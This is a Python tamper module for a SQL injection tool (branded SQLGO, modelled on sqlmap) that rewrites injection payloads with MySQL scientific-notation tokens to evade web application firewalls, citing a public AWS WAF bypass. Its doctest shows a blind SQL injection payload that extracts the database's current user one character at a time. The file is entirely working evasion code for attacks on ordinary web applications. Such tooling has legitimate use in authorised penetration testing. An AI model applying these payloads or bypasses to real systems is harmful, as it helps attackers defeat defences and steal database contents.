#!/usr/bin/env python
"""
# SQLGO License - Version 1.4

Copyright (C) 2023-2024 AliMirmohammad

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.


"""
import re



def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Abuses MySQL scientific notation

    Requirement:
        * MySQL

    Notes:
        * Reference: https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/

    >>> tamper('1 AND ORD(MID((CURRENT_USER()),7,1))>1')
    '1 AND ORD 1.e(MID((CURRENT_USER 1.e( 1.e) 1.e) 1.e,7 1.e,1 1.e) 1.e)>1'
    """

    if payload:
        payload = re.sub(r"[),.*^/|&]", r" 1.e\g<0>", payload)
        payload = re.sub(r"(\w+)\(", lambda match: "%s 1.e(" % match.group(1) if not re.search(r"(?i)\A(MID|CAST|FROM|COUNT)\Z", match.group(1)) else match.group(0), payload)     # NOTE: MID and CAST don't work for sure

    return payload